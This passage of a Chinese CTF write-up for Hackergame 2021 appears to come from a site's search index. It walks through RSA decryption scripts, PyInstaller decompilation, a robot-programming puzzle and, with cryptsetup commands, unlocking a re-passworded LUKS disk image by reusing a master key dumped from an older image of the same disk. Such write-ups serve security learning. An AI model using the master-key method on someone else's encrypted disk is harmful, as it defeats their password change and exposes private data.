\u7684\u503c\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528 <code>sympy.prevprime</code> \u9006\u63a8\u51fa\u6574\u4e2a value \u6570\u7ec4 <pre><code>value = [80096058210213458444437404275177554701604739094679033012396452382975889905967]\nfor i in range(1, 10):\n    value.append(sympy.prevprime(value[i - 1]))\nprint(\"value[-1] = \", value[-1])\n</code></pre></p> <p>\u540e\u9762\u8ba1\u7b97 value_q \u7ec6\u770b\u5176\u5b9e\u4e5f\u662f\u4e00\u4e2a RSA \u7b97\u6cd5\uff1a</p> <ul> <li>q\uff1a\u5bc6\u6587</li> <li>e\uff1a\u79c1\u94a5</li> <li>value_q\uff1a\u660e\u6587</li> <li>n\uff1a\u5c31\u662f n\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u662f\u4e24\u4e2a\u8d28\u6570\u76f8\u4e58\uff0c\u662f\u5341\u4e2a\u8d28\u6570\u76f8\u4e58 </li> </ul> <p>\u5341\u4e2a\u8d28\u6570\u76f8\u4e58\u5f97\u5230 n \u7684 RSA \u7b97\u6cd5\u4e5f\u4e00\u6837\uff0c\u56e0\u4e3a RSA \u7684\u6b63\u786e\u6027\u5e76\u6ca1\u6709\u8981\u6c42 n \u4e00\u5b9a\u662f\u4e24\u4e2a\u5927\u8d28\u6570\u76f8\u4e58\uff0c\u8fd9\u6837\u53ea\u662f\u96be\u4ee5\u7834\u89e3\u4fdd\u8bc1\u5b89\u5168\u6027 \u89e3\u51b3\u8fd9\u4e2a\u540c\u6837\u4e5f\u662f\u9700\u8981\u516c\u94a5 d\uff0c\u6240\u4ee5\u9700\u8981 phi(n) \u6839\u636e\u6b27\u62c9\u51fd\u6570\u7684\u6027\u8d28\uff0cphi(n) \u7b49\u4e8e n \u7684\u6240\u6709\u8d28\u56e0\u6570\u51cf\u4e00\u7684\u79ef \u5373 phi(n) = (value[0] - 1) * (value[1] - 1) * ... * (value[9] - 1)</p> <p>\u518d\u89e3\u5bc6\u5373\u53ef\u5f97\u5230\u5bc6\u6587 q\uff0c\u7136\u540e\u4e5f\u5c31\u5f97\u5230\u4e86 get_q \u7684\u7ed3\u679c</p> <pre><code>n = phi = 1\nfor i in range(10):\n    n = n * value[i]\n    phi *= (value[i] - 1)\n\nvalue_q = ...\nd = pow(e, -1, phi) \nq = pow(value_q, d, n)\nreturn sympy.nextprime(q)\n</code></pre> <p>flag:</p> <p>\u641e\u5b9a\u4e86 get_p \u548c get_q \u4e4b\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u89e3\u51fa flag \u4e86\uff1a <pre><code>e = 65537\np = get_p()\nq = get_q()\n\nc = ...\nd = pow(e, -1, (p-1) * (q-1))\nm = pow(c, d, p * q)\n\nprint(int.to_bytes(m, 30, byteorder=\"big\"))\n</code></pre></p>"},{"location":"writeups/hackergame2021/#u","title":"\u52a0\u5bc6\u7684 U \u76d8","text":"<p>\uff08\u672c\u6765\u633a\u597d\u505a\u7684\u4e00\u9053\u9898\uff0c\u600e\u4e48\u9898\u7ed9\u7684\u63d0\u793a\u6211\u5c31\u786c\u662f\u6ca1\u9886\u4f1a\u5230\uff09</p> <p>\u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e LUKS (Linux Unified Key Setup) \u7684\u6545\u4e8b\u3002</p> <p>\u7b2c\u4e00\u5929 \u5c0f T\uff1a\u300c\u4f60\u8981\u7684\u968f\u673a\u8fc7\u7a0b\u7684\u8bfe\u4ef6\u6211\u5e2e\u4f60\u62f7\u597d\u4e86\uff0c\u5728\u8fd9\u4e2a U \u76d8\u91cc\uff0cLUKS \u52a0\u5bc6\u7684\u5bc6\u7801\u662f suijiguocheng123123\u3002\u300d \u5c0f Z\uff1a\u300c\u554a\uff0c\u4f60\u53c8\u641e\u4e86 Linux \u6587\u4ef6\u7cfb\u7edf\u52a0\u5bc6\uff0c\u771f\u62ff\u4f60\u6ca1\u529e\u6cd5\u3002\u6211\u73b0\u5728\u4e0d\u65b9\u4fbf\u7528 Linux\uff0c\u6211\u76f4\u63a5\u628a\u8fd9\u5757\u76d8\u505a\u6210\u78c1\u76d8\u955c\u50cf\u6587\u4ef6\u518d\u56de\u53bb\u5904\u7406\u5427\u3002\u300d</p> <p>\u7b2c\u4e8c\u5929 \u5c0f Z\uff1a\u300c\u8c22\u8c22\u4f60\u6628\u5929\u5e2e\u6211\u62f7\u7684\u8bfe\u4ef6\u3002\u4f60\u6bcf\u6b21\u90fd\u641e\u8fd9\u4e2a\u52a0\u5bc6\uff0c\u5b83\u771f\u7684\u5b89\u5168\u5417\uff1f\u300d \u5c0f T\uff1a\u300c\u5f53\u7136\u4e86\uff01\u4f60\u770b\uff0c\u4f60\u8fd8\u7ed9\u6211\u4e4b\u540e\uff0c\u6211\u5df2\u7ecf\u628a\u8fd9\u5757\u76d8\u7684\u5f31\u5bc6\u7801\u6539\u6389\u4e86\uff0c\u73b0\u5728\u662f\u968f\u673a\u751f\u6210\u7684\u5f3a\u5bc6\u7801\uff0c\u8fd9\u6837\u9664\u4e86\u6211\u81ea\u5df1\uff0c\u4e16\u754c\u4e0a\u4efb\u4f55\u4eba\u90fd\u65e0\u6cd5\u89e3\u5bc6\u5b83\u4e86\u3002\u300d \u5c0f Z\uff1a\u300c\u6211\u53ef\u4e0d\u4fe1\u3002\u300d \u5c0f T\uff1a\u300c\u4f60\u4e0d\u4fe1\uff1f\u4f60\u770b\uff0c\u6211\u73b0\u5728\u5f80 U \u76d8\u91cc\u653e\u4e00\u4e2a flag \u6587\u4ef6\uff0c\u7136\u540e\u8fd9\u4e2a U \u76d8\u5c31\u7ed9\u4f60\u4e86\uff0c\u4f60\u7edd\u5bf9\u89e3\u5bc6\u4e0d\u51fa\u6765\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u3002\u5f53\u521d\u641e LUKS \u7684\u65f6\u5019\u6211\u53ef\u7814\u7a76\u4e86\u597d\u51e0\u5929\uff0c\u73ed\u4e0a\u53ef\u6ca1\u4eba\u6bd4\u6211\u66f4\u61c2\u52a0\u5bc6\uff01\u300d</p> <p>\u4e00\u5171\u7ed9\u4e86\u4e24\u4e2a img \u6587\u4ef6\uff0c\u901a\u8fc7 file \u53ef\u4ee5\u770b\u51fa\u90fd\u662f DOS/MBR boot sector <pre><code>$ file *.img \nday1.img:      DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 40959 sectors, extended partition table (last)\nday2.img:      DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 40959 sectors, extended partition table (last)\n</code></pre> \u6240\u4ee5\u5148\u76f4\u63a5 7z \u63d0\u53d6\uff0c\u5f97\u5230\u4e24\u4e2a\u65b0\u7684 img\uff0c\u518d file\uff1a <pre><code>$ file *.img \nMy Disk.img:   LUKS encrypted file, ver 2 [, , sha256] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998\nMy Disk 2.img: LUKS encrypted file, ver 2 [, , sha256] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998\n</code></pre> \u53d1\u73b0\u90fd\u662f LUKS encrypted file</p> <p>\u5728 Kali Linux \u91cc\u5c1d\u8bd5\u76f4\u63a5\u6302\u8f7d\u7b2c\u4e00\u4e2a img\uff0c\u8981\u6c42\u8f93\u5165\u5bc6\u7801\uff0c\u628a\u9898\u7ed9\u7684\u5bc6\u7801\u8f93\u5165\u5c31\u53ef\u4ee5\u770b\u5230 \u201c\u8bfe\u4ef6\u201d</p> <p>\u4ee5\u4e0a\u90fd\u662f\u5df2\u77e5\u7684\u8bd5\u9a8c\u90e8\u5206\uff0c\u771f\u6b63\u8981\u505a\u7684\u662f\u89e3\u5f00\u7b2c\u4e8c\u4e2a\u672a\u77e5\u5bc6\u7801\u7684 LUKS img  \u5df2\u77e5\u78c1\u76d8\u7684\u52a0\u5bc6\u4f7f\u7528\u7684\u662f luks2\uff0c\u5728\u7f51\u4e0a\u67e5\u4e86\u7834\u89e3 luks2 \u4e4b\u7c7b\u7684\u90fd\u8bf4 luks2 \u4e0d\u53ef\u7834\u89e3\uff0c\u6216\u8005\u662f\u4f7f\u7528\u5df2\u77e5\u7684\u5bc6\u7801\u5b57\u5178\u6765\u7206\u7834 \u4f46\u662f\u9898\u91cc\u8bf4\u4e86 \u201c\u968f\u673a\u751f\u6210\u7684\u5f3a\u5bc6\u7801\u201d\uff0c\u6240\u4ee5\u4e5f\u662f\u6ca1\u6709\u5bc6\u7801\u5b57\u5178\u7684</p> <p>\u5176\u5b9e\u8fd9\u9053\u9898\u7684\u6700\u5927\u63d0\u793a\u5c31\u5728\u4e8e\u5b83\u7ed9\u4e86\u4e24\u4e2a img\uff0c\u65e2\u7136\u7b2c\u4e00\u4e2a img \u6253\u5f00\u540e\u4ec5\u4ec5\u662f\u4e00\u4e2a\u8bfe\u4ef6\uff0c\u5982\u679c\u5b83\u7684\u7528\u5904\u4ec5\u4ec5\u662f\u7528\u6765\u8bd5\u9a8c luks \u600e\u4e48\u6253\u5f00\u7684\u8bdd\uff0c\u6839\u672c\u5b83\u6ca1\u5fc5\u8981\u7ed9\u51fa \u6240\u4ee5\u7b2c\u4e00\u4e2a img \u80af\u5b9a\u8fd8\u662f\u6709\u7528\u7684\u3002</p> <p>\u518d\u770b\u9898\u76ee\uff0c\u53cd\u590d\u8bf4\u4e86 U \u76d8\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a img \u5e94\u8be5\u662f\u540c\u4e00\u4e2a U \u76d8\u7684\u955c\u50cf\u6587\u4ef6\uff0c\u53ea\u662f\u66f4\u6539\u4e86\u5bc6\u7801\u800c\u5df2\uff08file \u770b\u5230\u7684 uuid \u4e5f\u662f\u4e00\u81f4\u7684\uff09 \u4e8e\u662f\u7ee7\u7eed\u5fc5\u5e94\uff0c\u53d1\u73b0\u540c\u4e00\u4e2a\u78c1\u76d8\u7684 <code>master-key</code> \u662f\u4e00\u6837\u7684\uff0c\u800c\u4e14\u53ef\u4ee5\u7528 master-key \u6765\u6dfb\u52a0\u5bc6\u7801\u6062\u590d\u78c1\u76d8\uff08\u89c1\uff1a10 Linux cryptsetup Examples for LUKS Key Management\uff09</p> <p>\u6240\u4ee5\u5c31\u8ddf\u7740\u6587\u7ae0\u91cc\u7684\u505a\u6cd5\uff0c\u4ece\u7b2c\u4e00\u4e2a img \u4e2d\u63d0\u53d6\u51fa master-key\uff0c\u7136\u540e\u7528\u5b83\u6765\u63d0\u4f9b AddKey \u7684\u6743\u9650\u3002\u6dfb\u52a0\u4e86\u65b0 passphrase \u540e\u5c31\u53ef\u4ee5\u7528\u65b0\u5bc6\u7801\u6253\u5f00\u78c1\u76d8\u4e86\uff1a <pre><code>$ cryptsetup luksDump --dump-master-key MyDisk.img  # \u8f93\u51fa master-key\n...\nMK dump:    be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40 \n            72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c \n            ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82 \n            60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a\n$ cat \"be...9a\" &gt; master_key.txt # \u5b58\u5165\u6587\u4ef6\n$ xxd -r -p master_key.txt master_key.bin # \u8f6c\u4e3a\u4e8c\u8fdb\u5236\n$ cryptsetup luksAddKey MyDisk2.img --master-key-file &lt;(cat master_key.bin) # \u6dfb\u52a0\u5bc6\u7801\nEnter new passphrase for key slot:    # \u8f93\u5165\u65b0\u5bc6\u7801\u5373\u53ef\uff0c\u56e0\u4e3amaster-key-file\u76f8\u5f53\u4e8e\u63d0\u4f9b\u4e86\u539f\u59cb\u5bc6\u7801\nVerify passphrase: \n</code></pre> \uff08\u4e00\u5b9a\u8981\u7528 root \u6743\u9650\u624d\u53ef\u4ee5\u52a0\u5bc6\u7801\uff09 \u7136\u540e\u6302\u8f7d\u3001\u8f93\u5165\u5bc6\u7801\uff0c\u5c31\u53ef\u4ee5\u770b\u5230 flag.txt \u4e86</p>"},{"location":"writeups/hackergame2021/#_9","title":"\u8d5b\u535a\u53a8\u623f","text":"<p>\u867d\u7136\u8fd9\u662f\u4f60\u7684\u9910\u5385\uff0c\u4f46\u53ea\u6709\u673a\u5668\u4eba\u53ef\u4ee5\u5728\u53a8\u623f\u5de5\u4f5c\u3002\u673a\u5668\u4eba\u7cbe\u786e\u5730\u6309\u7167\u7a0b\u5e8f\u5de5\u4f5c\uff0c\u5728\u53a8\u623f\u4e2d\u79fb\u52a8\uff0c\u4ece\u7269\u54c1\u6e90\u53d6\u51fa\u98df\u6750\uff0c\u6309\u7167\u83dc\u8c31\u7684\u987a\u5e8f\u628a\u98df\u6750\u4f9d\u6b21\u653e\u5165\u9505\u5185\u3002</p> <p>\u673a\u5668\u4eba\u4e0d\u9700\u8981\u4f11\u606f\uff0c\u53ea\u9700\u8981\u4e00\u4e2a\u665a\u4e0a\u7684\u65f6\u95f4\u6765\u5b66\u4e60\u4f60\u6559\u7ed9\u5b83\u7684\u7a0b\u5e8f\uff0c\u5728\u6b64\u4e4b\u540e\u4f60\u5c31\u53ef\u4ee5\u5728\u4efb\u4f55\u65f6\u5019\u8ba9\u673a\u5668\u4eba\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u7684\u6bcf\u4e00\u6b65\u6267\u884c\u90fd\u4f1a\u88ab\u8bb0\u5f55\u4e0b\u6765\uff0c\u65b9\u4fbf\u4f60\u68c0\u67e5\u673a\u5668\u4eba\u505a\u83dc\u7684\u8fc7\u7a0b\u3002</p> <p>\u53e6\u5916\u4e3a\u4e86\u7b26\u5408\u98df\u54c1\u5b89\u5168\u6cd5\u7684\u8981\u6c42\uff0c\u8d5b\u535a\u53a8\u623f\u4e2d\u7684\u673a\u5668\u4eba\u540c\u4e00\u65f6\u95f4\u624b\u91cc\u53ea\u80fd\u62ff\u4e00\u79cd\u98df\u7269\uff0c\u6bcf\u6b21\u505a\u83dc\u524d\u90fd\u5fc5\u987b\u6267\u884c\u6e05\u7406\u53a8\u623f\u7684\u64cd\u4f5c\uff0c\u628a\u5404\u5904\u7684\u98df\u7269\u6b8b\u6e23\u6e05\u7406\u6389\uff0c\u7136\u540e\u56de\u5230\u53a8\u623f\u89d2\u843d\u5f85\u547d\u3002</p> <p>\u6bcf\u5929\u7684\u83dc\u8c31\u53ef\u80fd\u4e0d\u540c\uff0c\u4f46\u4e5f\u8bb8\u4e5f\u5b58\u5728\u4e00\u4e9b\u89c4\u5f8b\u3002</p> <p>\u5bf9\u673a\u5668\u4eba\u7f16\u7a0b\u53ef\u4ee5\u4f7f\u7528\u7684\u6307\u4ee4\u6709\uff08n, m \u4e3a\u6574\u6570\u53c2\u6570\uff0c\u7a0b\u5e8f\u7684\u884c\u53f7\u4ece 0 \u5f00\u59cb\uff0c\u6ce8\u610f\u6307\u4ee4\u4e2d\u9700\u8981\u6b63\u786e\u4f7f\u7528\u7a7a\u683c\uff09\uff1a</p> <p>\u5411\u4e0a n \u6b65 \u5411\u4e0b n \u6b65 \u5411\u5de6 n \u6b65 \u5411\u53f3 n \u6b65 \u653e\u4e0b n \u4e2a\u7269\u54c1 \u62ff\u8d77 n \u4e2a\u7269\u54c1 \u653e\u4e0b\u76d8\u5b50 \u62ff\u8d77\u76d8\u5b50 \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0a\u8df3\u8f6c m \u884c \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0b\u8df3\u8f6c m \u884c</p> <p>\u8d76\u7d27\u8fdb\u5165\u8d5b\u535a\u53a8\u623f\u5f00\u59cb\u505a\u83dc\u5427\uff01</p> <p>\u521a\u770b\u9898\u8fd8\u662f\u633a\u61f5\u7684\uff0c\u60f3\u4e86\u597d\u534a\u5929\u624d\u660e\u767d \u7b80\u5355\u8bf4\u6765\u5c31\u662f\uff0c\u6bcf\u5929\u53ef\u4ee5\u7f16\u5199\u65b0\u7684\u7a0b\u5e8f\uff0c\u4f46\u662f\u53ea\u80fd\u8fd0\u884c\u4e00\u4e2a\u4e4b\u524d\u7f16\u5199\u8fc7\u7684\u7a0b\u5e8f \u6bcf\u4e2a\u7a0b\u5e8f\u53ea\u6709\u51e0\u79cd\u6307\u4ee4\u53ef\u4ee5\u4f7f\u7528\uff0c\u9700\u8981\u5728\u5176\u4e2d\u6ee1\u8db3\u83dc\u8c31\u7684\u987a\u5e8f\u8981\u6c42</p> <p>\u800c\u95ee\u9898\u5728\u4e8e\uff0c\u7f16\u5199\u7a0b\u5e8f\u540e\u7684\u7b2c\u4e8c\u5929\u7684\u83dc\u8c31\u53ef\u80fd\u4f1a\u4e0d\u540c\uff0c\u5bfc\u81f4\u524d\u9762\u7f16\u5199\u7684\u7a0b\u5e8f\u65e0\u6cd5\u4f7f\u7528 \u6240\u4ee5\u5c31\u9700\u8981\u9884\u6d4b\u7b2c\u4e8c\u5929\u7684\u83dc\u8c31</p>"},{"location":"writeups/hackergame2021/#level-0","title":"Level 0","text":"<p>\u53ef\u4ee5\u770b\u5230\u7b2c 0 \u5929\u7684\u83dc\u8c31\u662f 1, 0\uff0c\u4e5f\u5c31\u662f\u8981\u5728\u540c\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\u4f9d\u6b21\u5411\u9505(1,0)\u4e2d\u653e\u5165 1 \u53f7\u98df\u7269(0,2)\u548c 0 \u53f7\u98df\u7269(0,1) \u968f\u4fbf\u7f16\u5199\u7a0b\u5e8f\u4fdd\u5b58\uff0c\u76f4\u63a5\u5230\u4e0b\u4e00\u5929\uff0c\u53ef\u4ee5\u53d1\u73b0\u83dc\u8c31\u53d1\u751f\u4e86\u53d8\u5316 \u591a\u6b21\u5c1d\u8bd5\u4e4b\u540e\u53d1\u73b0\u83dc\u8c31\u53ea\u6709 0,0 / 0,1 / 1,0 / 1,1 \u56db\u79cd</p> <p>\u6240\u4ee5\u5728\u7b2c 0 \u5929\u7f16\u5199\u5b66\u4e60\u56db\u4e2a\u7a0b\u5e8f\uff0c\u5230\u4e0b\u4e00\u5929\u5c31\u53ef\u4ee5\u6839\u636e\u83dc\u8c31\u6765\u6267\u884c\u4e86 \u4f8b\u5982\u7a0b\u5e8f 1,0 \u5c31\u53ef\u4ee5\u7f16\u5199\u4e3a\uff1a <pre><code>\u5411\u53f3 2 \u6b65\n\u62ff\u8d77 1 \u4e2a\u7269\u54c1\n\u5411\u5de6 2 \u6b65\n\u5411\u4e0b 1 \u6b65\n\u653e\u4e0b 1 \u4e2a\u7269\u54c1\n\u5411\u4e0a 1 \u6b65\n\u5411\u53f3 1 \u6b65\n\u62ff\u8d77 1 \u4e2a\u7269\u54c1\n\u5411\u5de6 1 \u6b65\n\u5411\u4e0b 1 \u6b65\n\u653e\u4e0b 1 \u4e2a\u7269\u54c1\n\u5411\u4e0a 1 \u6b65\n</code></pre> \u53ea\u8981\u6b63\u786e\u4e86\u4e00\u5929\uff0c\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86</p>"},{"location":"writeups/hackergame2021/#level-1","title":"Level 1","text":"<p>\u53ea\u6709 1 \u4e2a\u98df\u7269\uff0c\u83dc\u8c31\u662f\u597d\u591a 0 \u540c\u6837\u968f\u4fbf\u7f16\u5199\u7a0b\u5e8f\u4fdd\u5b58\u8fdb\u5165\u4e0b\u4e00\u5929\uff0c\u53d1\u73b0\u83dc\u8c31\u6ca1\u6709\u53d8\u5316\uff0c\u8fd8\u662f 73 \u4e2a 0 \u6240\u4ee5\u8fd9\u4e00\u5173\u53ef\u80fd\u53ea\u662f\u5faa\u73af\u7684\u6559\u7a0b \u53ef\u7528\u7684\u6307\u4ee4\u4e2d\u6709\u4e00\u6761 \u201c\u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0a\u8df3\u8f6c m \u884c\u201d \u53ef\u4ee5\u7528\u5b83\u6765\u8fbe\u5230\u5faa\u73af\u7684\u6548\u679c</p> <p>\u53ea\u9700\u8981\u62ff 73 \u4e2a\u7269\u54c1\uff0c\u7136\u540e\u5faa\u73af\u653e\u4e0b\u76f4\u5230\u624b\u4e2d\u6ca1\u6709\u4e86\u5373\u53ef <pre><code>\u5411\u53f3 1 \u6b65\n\u62ff\u8d77 73 \u4e2a\u7269\u54c1\n\u5411\u5de6 1 \u6b65\n\u5411\u4e0b 1 \u6b65\n\u653e\u4e0b 1 \u4e2a\u7269\u54c1\n\u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e 1 \u5411\u4e0a\u8df3\u8f6c 1 \u884c\n</code></pre> \u540c\u6837\u4fdd\u5b58\u4e0b\u4e00\u5929\u6267\u884c\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86 </p> <p>\u5269\u4e0b\u7684\u4e24\u4e2a\u770b\u8d77\u6765\u5927\u6982\u662f\u901a\u8fc7\u6e90\u7801\u6765\u63a8\u6d4b\u51fa\u83dc\u8c31\u7684\u751f\u6210\u65b9\u6cd5\uff0c\u7136\u540e\u7f16\u5199\u76f8\u5e94\u7684\u6307\u4ee4\uff0c\u592a\u96be\u4e86\uff0c\u4e0d\u4f1aqwq</p>"},{"location":"writeups/hackergame2021/#micro-world","title":"Micro World","text":"<p>\u5b87\u5b99\u4e2d\u67d0\u4e00\u7247\u6781\u5176\u5fae\u5c0f\u7684\u533a\u57df\u91cc\u7684\u7c92\u5b50\u88ab\u4e00\u80a1\u795e\u79d8\u529b\u91cf\u521d\u59cb\u5316\u8bbe\u7f6e\u6210\u4e86 flag \u7684\u5f62\u72b6\uff0c\u7a0b\u5e8f\u5fe0\u5b9e\u5730\u8bb0\u5f55\u4e86\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\u8fd9\u7247\u533a\u57df\u7684\u7c92\u5b50\u8fd0\u52a8\u60c5\u51b5\u3002</p> <p>\u62ff\u5230\u4e86 exe \u6587\u4ef6\uff0c\u770b\u8d77\u6765\u633a\u7cbe\u81f4\uff0c\u8fd0\u884c\u8d77\u6765\u662f\u4e00\u4e9b\u70b9\u8fd0\u52a8\u78b0\u649e\u7684\u573a\u666f \u62d6\u5230 IDA \u91cc\u770b\u770b\uff0c\u53d1\u73b0\u4e86 __main__ \u4ee5\u53ca .rdata \u91cc\u4e00\u4e9b py \u6709\u5173\u7684\u5b57\u7b26\u4e32\uff1a  \u6240\u4ee5\u63a8\u6d4b\u662f\u4f7f\u7528 python \u7f16\u5199\u7684\uff0c\u7136\u540e\u7528 pyinstaller \u6253\u5305</p> <p>\u8fd9\u6837\u7684\u8bdd\u8bd5\u7740\u7528 pyinstxtractor \u89e3\u5305 .exe\uff0c\u6210\u529f\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\u5939 \u91cc\u9762\u662f\u4e00\u5806 .pyc .pyd .dll \u6587\u4ef6\uff0c\u4ece\u540d\u5b57\u5c31\u53ef\u4ee5\u770b\u51fa\u5927\u90e8\u5206\u662f import \u7684\u5305\uff0c\u53ea\u6709\u4e00\u4e2a\u7279\u522b\u7684 2.pyc  \u6240\u4ee5\u8fd9\u4e2a\u5e94\u8be5\u5c31\u662f\u7f16\u8bd1\u540e\u7684\u6e90\u7801\u4e86</p> <p>\u63a5\u4e0b\u6765\u7528 uncompyle6 \u6765\u53cd\u7f16\u8bd1 pyc \u6587\u4ef6\uff0c\u8f93\u51fa\u5f97\u5230\u4e86\u6e90\u7801 2.py \u5c1d\u8bd5\u8fd0\u884c\uff0c\u53d1\u73b0\u8dd1\u8d77\u6765\u4e4b\u540e\u53ea\u6709\u4e00\u4e2a\u70b9\u5728\u8fd0\u52a8\uff0c\u5e94\u8be5\u662f\u53cd\u7f16\u8bd1\u65f6\u51fa\u4e86\u4e9b\u95ee\u9898 \u4e8e\u662f\u5f00\u59cb\u770b\u6e90\u7801 </p> <p>\u57fa\u672c\u4e0a\u7b80\u5355\u8bf4\u5c31\u662f\uff0c\u521d\u59cb\u6709\u4e00\u4e9b\u6570\u636e\uff0c\u8868\u793a\u6bcf\u4e2a\u70b9\u7684\u4f4d\u7f6e\u548c\u901f\u5ea6\uff0c\u7136\u540e\u8fd0\u884c\uff0c\u6bcf\u6b21\u8fd0\u884c\u90fd\u68c0\u6d4b\u78b0\u649e\uff0c\u7136\u540e\u83b7\u5f97\u65b0\u7684\u70b9\u4f4d\u7f6e\uff0c\u518d\u7ed8\u5236\u51fa\u6765 \u8c03\u8bd5\u4e00\u4e0b\uff0c\u8f93\u51fa\u6bcf\u6b21\u7684 pointlist\uff0c\u53d1\u73b0\u7b2c\u4e00\u6b21\u662f\u6240\u6709\u70b9\uff0c\u7b2c\u4e8c\u6b21\u53d8\u62102\u4e2a\uff0c\u7b2c\u4e09\u6b21\u5f80\u540e\u5c31\u53ea\u6709\u4e00\u4e2a\u4e86 \u6240\u4ee5\u95ee\u9898\u5927\u6982\u5c31\u51fa\u5728\u4e86 next_pos_list \u51fd\u6570\uff1a <pre><code>def next_pos_list(Pointlist):\n    pointlist = []\n    for i in range(len(Pointlist)):\n        for point in Pointlist[i + 1:]:\n            times = checkcrush(Pointlist[i], point)\n            if times != None:\n                a, b = get_new_point(times, Pointlist[i], point)\n                pointlist.extend([a, b])\n                Pointlist[i].flag = 0\n                point.flag = 0\n        else:\n            for item in Pointlist:\n                if item.flag != 0:\n                    pointlist.append(Point((item.x + item.vx, item.y + item.vy), item.vx, item.vy))\n                for poi in pointlist:\n                    poi.x = poi.x % WIDTH\n                    poi.y = poi.y % HEIGHT\n                else:\n                    return pointlist\n</code></pre> \u4ed4\u7ec6\u8bfb\u4e00\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u9762\u7684 for-else \u5757\u5f88\u5947\u602a\uff0c\u5bfc\u81f4\u5faa\u73af\u7ed3\u675f\u548c return \u90fd\u65e9\u4e86\uff0c\u6240\u4ee5\u6839\u636e\u51fd\u6570\u7684\u610f\u601d\u6539\u4e00\u6539\uff1a <pre><code>def next_pos_list(Pointlist):\n    pointlist = []\n    for i in range(len(Pointlist)):\n        for point in Pointlist[i + 1:]:\n            ...\n    for item in Pointlist:\n        ...\n    return pointlist\n</code></pre> \u8fd9\u6837\u5c31\u53ef\u4ee5\u6210\u529f\u8fd0\u884c\u4e86</p> <p>\u4f46\u662f\u753b\u9762\u4ecd\u7136\u662f\u6742\u4e71\u7684\u3002\u56e0\u4e3a\u9898\u91cc\u8bf4\u4e86 \u201c\u8bb0\u5f55\u4e86\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\u8fd9\u7247\u533a\u57df\u7684\u7c92\u5b50\u8fd0\u52a8\u60c5\u51b5\u201d \u6240\u4ee5\u9700\u8981\u5c06\u8f68\u8ff9\u5f80\u524d\u63a8\uff0c\u6700\u65b9\u4fbf\u7684\u65b9\u6cd5\u5c31\u662f\u66f4\u6539\u6bcf\u4e2a\u70b9\u7684\u901f\u5ea6\u65b9\u5411\uff1a <pre><code>Pointlist = []\nfor item in list_:\n    Pointlist.append(Point((item[0], item[1]), -item[2], -item[3]))\n</code></pre> \u8fd0\u884c\u540e\u7b49\u5f85\u4e00\u5c0f\u4f1a\u513f\u5c31\u53ef\u4ee5\u770b\u5230\u70b9\u9010\u6e10\u6709\u5e8f\uff0c\u5728\u67d0\u4e00\u523b\u6c47\u6210\u4e86 flag\uff1a  \u867d\u7136\u4e0d\u592a\u6e05\u6670\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u731c\u4e2a\u5927\u6982</p>"},{"location":"writeups/hackergame2021/#_10","title":"\u9635\u5217\u6062\u590d\u5927\u5e08","text":"<p>\uff08\u8fd9\u9898\u6574\u6574\u505a\u4e86\u6211\u4e24\u5929\u591a\uff0c\u6bcf\u5929\u665a\u4e0a\u90fd\u5bf9\u7740\u78c1\u76d8\u9635\u5217\u2026\u2026\uff09</p> <p>\u4ee5\u4e0b\u662f\u4e24\u4e2a\u538b\u7f29\u5305\uff0c\u5206\u522b\u662f\u4e00\u4e2a RAID 0 \u9635\u5217\u7684\u78c1\u76d8\u538b\u7f29\u5305\uff0c\u548c\u4e00\u4e2a RAID 5 \u9635\u5217\u7684\u78c1\u76d8\u538b\u7f29\u5305\uff0c\u5bf9\u5e94\u672c\u9898\u7684\u4e24\u5c0f\u95ee\u3002\u4f60\u9700\u8981\u89e3\u6790\u5f97\u5230\u6b63\u786e\u5b8c\u6574\u7684\u78c1\u76d8\u9635\u5217\uff0c\u6302\u8f7d\u7b2c\u4e00\u4e2a\u5206\u533a\u540e\u5728\u8be5\u5206\u533a\u6839\u76ee\u5f55\u4e0b\u4f7f\u7528 Python 3.7 \u6216\u4ee5\u4e0a\u7248\u672c\u6267\u884c getflag.py \u811a\u672c\u4ee5\u83b7\u53d6 flag\u3002\u78c1\u76d8\u6570\u636e\u4fdd\u8bc1\u65e0\u635f\u574f\u3002</p>"},{"location":"writeups/hackergame2021/#raid-5","title":"RAID 5","text":"<p>\u867d\u7136 RAID 5 \u662f\u7b2c\u4e8c\u95ee\uff0c\u800c\u4e14\u5206\u6570\u9ad8\uff0c\u4f46\u662f\u66f4\u597d\u505a\uff0c\u800c\u4e14\u505a\u51fa\u7684\u4eba\u4e5f\u591a\u3002 